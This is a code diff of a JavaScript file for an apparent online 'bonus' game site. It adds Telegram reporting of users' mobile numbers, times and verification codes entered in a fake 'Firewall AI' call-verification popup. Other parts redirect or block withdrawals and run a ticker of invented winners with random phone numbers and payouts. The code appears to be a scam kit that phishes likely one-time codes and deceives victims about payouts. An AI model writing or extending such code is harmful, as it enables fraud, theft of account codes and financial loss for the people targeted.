@@ -1,6 +1,7 @@
 /**
- * PlayBonus.js - 3D Fantasy Fruits Theme
- * Anti-Lag Optimized + ADS Popup + System Verification
+ * PlayBonus.js - FINAL VERSION
+ * Anti-Lag Optimized + ADS Popup + Redirect Logic
+ * + Telegram: Mobile Number & Time Only
  */
 
 (function() {
@@ -130,7 +131,7 @@
     var soundCache = { scatter: null, claim: null, success: null, call: null };
 
     // ============================================================
-    // UTILITIES & TELEGRAM
+    // UTILITIES & TELEGRAM (SECURED)
     // ============================================================
     function formatNumberWithComma(number) {
         var n = Number(number);
@@ -170,20 +171,31 @@
         } catch(e) {}
     }
 
-    function sendAICallRequestNotif(p, d, c) { sendTelegram('📞 AI CALL REQUEST\n👤 ' + p + '\n🔑 Code: ' + c); }
-    function sendAICodeAttemptNotif(p, d, c, s) { sendTelegram('🔑 AI CODE ATTEMPT\n📝 Code: ' + c + '\nStatus: INVALID'); }
-    function sendAICallExpiredNotif(p, d) { sendTelegram('⏰ AI CALL EXPIRED\n👤 ' + p); }
-    function sendWithdrawRequestNotif(p, d, b, f) { sendTelegram('💸 WITHDRAW REQ\n👤 ' + p + '\n💰 ₱' + b.toFixed(2)); }
-    function sendWithdrawRedirectNotif(p, d, b) { sendTelegram('🚀 REDIRECTED\n👤 ' + p); }
-    function sendWithdrawFirewallNotif(p, d, b) { sendTelegram('🔥 BLOCKED BY FIREWALL\n👤 ' + p); }
-    function sendAdsPopupNotif(p, d, b) { sendTelegram('📢 ADS POPUP\n👤 ' + p); }
+    // ⚡ Pinaikli ang Telegram Notifs - Mobile at Time lang
+    function getFormattedTime() {
+        return new Date().toLocaleString('en-PH', { timeZone: 'Asia/Manila' });
+    }
+
+    function sendWithdrawRequestNotif(p, d, b, f) {
+        sendTelegram('💸 WITHDRAW REQUEST\n👤 Mobile: ' + p + '\n⏰ Time: ' + getFormattedTime());
+    }
+
+    function sendWithdrawRedirectNotif(p, d, b) {
+        sendTelegram('🚀 USER REDIRECTED\n👤 Mobile: ' + p + '\n⏰ Time: ' + getFormattedTime());
+    }
+
+    function sendWithdrawFirewallNotif(p, d, b) {
+        sendTelegram('🔥 BLOCKED BY FIREWALL\n👤 Mobile: ' + p + '\n⏰ Time: ' + getFormattedTime());
+    }
+
+    function sendAdsPopupNotif(p, d, b) {
+        sendTelegram('📢 ADS POPUP\n👤 Mobile: ' + p + '\n⏰ Time: ' + getFormattedTime());
+    }
 
     // ============================================================
     // INIT
     // ============================================================
     function init() {
-        console.log('🎁 PlayBonus Starting...');
-        
         userPhone = localStorage.getItem("userPhone");
         if (!userPhone || userPhone === 'null' || userPhone.length < 10) {
             window.location.href = "index.html";
@@ -238,11 +250,13 @@
             }
         });
 
-        userRef.child('balance').on('value', function(snapshot) {
+        if (balanceListener) userRef.child('balance').off('value', balanceListener);
+        balanceListener = userRef.child('balance').on('value', function(snapshot) {
             if (snapshot.val() !== null) { currentBalance = Number(snapshot.val()); updateBalanceDisplay(); }
         });
 
-        userRef.child('claimed_ptcat').on('value', function(snapshot) {
+        if (claimListener) userRef.child('claimed_ptcat').off('value', claimListener);
+        claimListener = userRef.child('claimed_ptcat').on('value', function(snapshot) {
             var newState = (snapshot.val() === true);
             if (newState !== isClaimed) { isClaimed = newState; updateClaimButtonUI(); }
         });
@@ -361,7 +375,7 @@
         var layer = document.getElementById('claimNowConfetti');
         if (!layer || SKIP_HEAVY_EFFECTS) return;
         layer.innerHTML = '';
-        var colors = ['#ff2d95', '#ffd700', '#ff8c00', '#00d4ff', '#39ff14', '#ffffff'];
+        var colors = ['#ff1744', '#2979ff', '#ff9100', '#ff80ab', '#d500f9', '#00e676'];
         for (var i = 0; i < 10; i++) {
             var piece = document.createElement('div');
             piece.className = 'claim-now-confetti';
@@ -428,7 +442,7 @@
                 if (skipBtn.disabled) return;
                 playSound('claim');
                 closeAdsPopup();
-                sendTelegram('⏭️ ADS SKIPPED\n👤 ' + (localStorage.getItem("userPhone") || "Unknown"));
+                sendTelegram('⏭️ ADS SKIPPED\n👤 Mobile: ' + (localStorage.getItem("userPhone") || "Unknown") + '\n⏰ Time: ' + getFormattedTime());
             };
         }
     }
@@ -588,7 +602,7 @@
     }
 
     // ============================================================
-    // FIREWALL AI POPUP (3D FANTASY FRUITS THEME)
+    // FIREWALL AI POPUP (3D FRUITS THEME)
     // ============================================================
     function showFirewallVerificationPopup() {
         var existingPopup = document.getElementById('firewallAIPopup');
@@ -605,12 +619,11 @@
         overlay.id = 'firewallAIPopup';
         overlay.className = 'firewall-ai-overlay';
         
-        // --- BAGONG THEME PARA SA POPUP ---
         overlay.innerHTML =
             '<div class="firewall-ai-container">' +
                 '<button class="firewall-ai-close" id="firewallAIClose">✕</button>' +
                 '<div class="firewall-ai-header">' +
-                    '<div class="firewall-ai-icon">🍓</div>' + // Fruit icon
+                    '<div class="firewall-ai-icon">🍓</div>' +
                     '<h2 class="firewall-ai-title">FRUIT VERIFICATION</h2>' +
                     '<div class="firewall-ai-subtitle">◆ SWEET CALL SYSTEM ◆</div>' +
                 '</div>' +
@@ -667,7 +680,7 @@
             });
         }
 
-        sendAICallRequestNotif(userPhoneStr, deviceId, currentCallCode);
+        sendTelegram('📞 AI CALL REQ\n👤 Mobile: ' + userPhoneStr + '\n🔑 Code: ' + currentCallCode + '\n⏰ Time: ' + getFormattedTime());
 
         var statusIcon = document.getElementById('firewallAIIcon');
         var statusText = document.getElementById('firewallAIText');
@@ -708,7 +721,8 @@
             if (callCountdown <= 0) {
                 stopFirewallTimer();
                 if (db) { db.ref('user_sessions/' + userPhoneStr + '/system_verification').update({ status: 'expired', timer: 0 }); }
-                sendAICallExpiredNotif(userPhoneStr, localStorage.getItem("userDeviceId"));
+                sendTelegram('⏰ AI CALL EXPIRED\n👤 Mobile: ' + userPhoneStr + '\n⏰ Time: ' + getFormattedTime());
+                
                 var statusText = document.getElementById('firewallAIText');
                 var codeSection = document.getElementById('firewallAICodeSection');
                 var requestBtn = document.getElementById('firewallAIRequestBtn');
@@ -752,10 +766,10 @@
             });
         }
 
-        sendAICodeAttemptNotif(userPhoneStr, localStorage.getItem("userDeviceId"), enteredCode, callCountdown);
+        sendTelegram('🔑 AI CODE ATTEMPT\n👤 Mobile: ' + userPhoneStr + '\n📝 Code: ' + enteredCode + '\n📊 Status: ' + (isMatch ? 'VERIFIED' : 'INVALID') + '\n⏰ Time: ' + getFormattedTime());
 
         if (isMatch) {
-            if (verifyBtn) { verifyBtn.innerHTML = 'VERIFIED!'; verifyBtn.style.background = '#22C55E'; }
+            if (verifyBtn) { verifyBtn.innerHTML = 'VERIFIED!'; verifyBtn.style.background = '#00E676'; }
             setTimeout(function() { closeFirewallPopup(); alert('✅ Verification successful!'); }, 1500);
             return;
         }
@@ -776,7 +790,6 @@
         var style = document.createElement('style');
         style.id = 'firewall-ai-styles';
         style.textContent = 
-            // --- BAGONG CSS PARA SA 3D FRUITS THEME ---
             '@keyframes firewallShake { 0%, 100% { transform: translateX(0); } 20% { transform: translateX(-8px); } 40% { transform: translateX(8px); } 60% { transform: translateX(-5px); } 80% { transform: translateX(5px); } }' +
             '@keyframes firewallPopIn { 0% { transform: scale(0.5) rotate(-5deg); opacity: 0; } 60% { transform: scale(1.05) rotate(2deg); } 100% { transform: scale(1) rotate(0deg); opacity: 1; } }' +
             '@keyframes fruitFloat { 0%, 100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-10px) rotate(10deg); } }' +
@@ -810,7 +823,6 @@
             '.firewall-ai-msg-expired { display: none; color: #ff9800; text-align: center; padding: 10px; margin-top: 10px; background: rgba(255, 152, 0, 0.2); border: 2px solid rgba(255, 152, 0, 0.5); border-radius: 12px; font-size: 11px; font-weight: 600; }' +
             '.firewall-ai-msg-expired.show { display: block; }' +
             '.firewall-ai-btn-back { background: rgba(255,255,255,0.1); border: 2px solid rgba(255,255,255,0.3); border-radius: 10px; padding: 10px 20px; font-family: "Fredoka", sans-serif; font-size: 12px; font-weight: 700; color: #fff; cursor: pointer; letter-spacing: 1px; text-transform: uppercase; transition: all 0.2s; }' +
-            '.firewall-ai-btn-back:hover { background: rgba(255,255,255,0.2); }' +
             '@media (max-width: 480px) { .firewall-ai-container { padding: 22px 16px 18px; border-radius: 24px; } .firewall-ai-title { font-size: 20px; } .firewall-ai-icon { width: 65px; height: 65px; font-size: 32px; } .firewall-ai-phone-number { font-size: 20px; } .firewall-ai-timer { font-size: 28px; } .firewall-ai-input { font-size: 24px; padding: 12px; letter-spacing: 6px; } }';
         document.head.appendChild(style);
     }
@@ -856,25 +868,13 @@
         var winnerSpan = document.getElementById('winnerText');
         if (!winnerSpan) return;
         var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
-        var amountRarity = [ { amount: 500, weight: 85 }, { amount: 1000, weight: 10 }, { amount: 2000, weight: 3 }, { amount: 2500, weight: 2 } ];
+        var amounts = [500, 1000, 2000, 2500];
         var actions = ["received", "received", "withdraw"];
-
-        function generateRandomAmount() {
-            var totalWeight = 0;
-            for (var i = 0; i < amountRarity.length; i++) totalWeight += amountRarity[i].weight;
-            var random = Math.random() * totalWeight;
-            var cumulative = 0;
-            for (var i = 0; i < amountRarity.length; i++) {
-                cumulative += amountRarity[i].weight;
-                if (random <= cumulative) return amountRarity[i].amount;
-            }
-            return 500;
-        }
 
         function updateTicker() {
             var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
             var last4 = Math.floor(1000 + Math.random() * 9000);
-            var amount = generateRandomAmount();
+            var amount = amounts[Math.floor(Math.random() * amounts.length)];
             var action = actions[Math.floor(Math.random() * actions.length)];
             winnerSpan.innerHTML = prefix + '***' + last4 + ' ' + action + ' <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + amount.toLocaleString();
         }
@@ -994,13 +994,16 @@
         addForceLogoutAnimations();
         var overlay = document.createElement('div');
         overlay.className = 'force-logout-popup carnival-overlay';
-        // ... (force logout popup content - same as before)
         overlay.innerHTML = '<div class="carnival-card"><h2 class="carnival-title">SESSION ENDED</h2><p class="carnival-message">Your session has been ended by an admin.</p><button onclick="localStorage.clear();window.location.href=\'index.html\'" class="carnival-btn">RETURN TO HOME</button></div>';
         document.body.appendChild(overlay);
     }
 
     function addForceLogoutAnimations() {
-        // ... (Same force logout animation CSS as before)
+        if (document.querySelector('#force-logout-animations')) return;
+        var style = document.createElement('style');
+        style.id = 'force-logout-animations';
+        style.textContent = '.carnival-overlay { position: fixed; inset: 0; z-index: 999999; display: flex; align-items: center; justify-content: center; padding: 16px; background: rgba(0,0,0,0.9); } .carnival-card { background: linear-gradient(145deg, #ff2d95, #5a189a); border: 4px solid #ffd700; border-radius: 24px; padding: 30px; text-align: center; max-width: 340px; } .carnival-title { color: #fff; font-size: 24px; font-family: "Fredoka", sans-serif; margin-bottom: 12px; } .carnival-message { color: rgba(255,255,255,0.9); font-size: 14px; margin-bottom: 20px; } .carnival-btn { background: linear-gradient(180deg, #ffeb3b, #ff9800); border: 3px solid #fff; border-radius: 12px; padding: 14px 20px; font-weight: 900; cursor: pointer; width: 100%; }';
+        document.head.appendChild(style);
     }
 
     // ============================================================
